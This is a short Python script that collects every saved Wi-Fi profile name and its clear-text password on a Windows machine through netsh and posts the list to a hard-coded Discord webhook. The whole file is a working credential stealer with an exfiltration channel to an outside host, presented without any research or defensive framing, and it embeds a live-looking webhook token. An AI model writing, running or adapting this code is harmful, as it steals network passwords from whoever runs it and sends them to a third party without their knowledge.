import subprocess
from dhooks import Webhook, Embed

def get_wifi_passwords():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]

        passwords = []
        for profile in profiles:
            try:
                result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True, check=True)
                password_lines = [line for line in result.stdout.splitlines() if "Key Content" in line]
                
                if password_lines:
                    password_line = password_lines[0]
                    password = password_line.split(":")[1].strip()
                    passwords.append({"name": profile, "password": password})
                else:
                    passwords.append({"name": profile, "password": "Not Available"})
            except subprocess.CalledProcessError:
                passwords.append({"name": profile, "password": "Not Available"})

        return passwords

    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return []

wifi_passwords = get_wifi_passwords()

embed = Embed(
    title='Wi-Fi Passwords',
    description='\n'.join([f"{wifi['name']}: {wifi['password']}" for wifi in wifi_passwords]),
    color=0xff0000  # You can set the color as needed
)

webhook_url = 'https://discord.com/api/webhooks/1206959428578967582/CO3XTmC3s-sBGqQkAU4pQuce-mSX1jIpJ7NxV1jUCV4B9swheeqyM1aISRp-gOApwWIq'

hook = Webhook(webhook_url)
hook.send(embed=embed)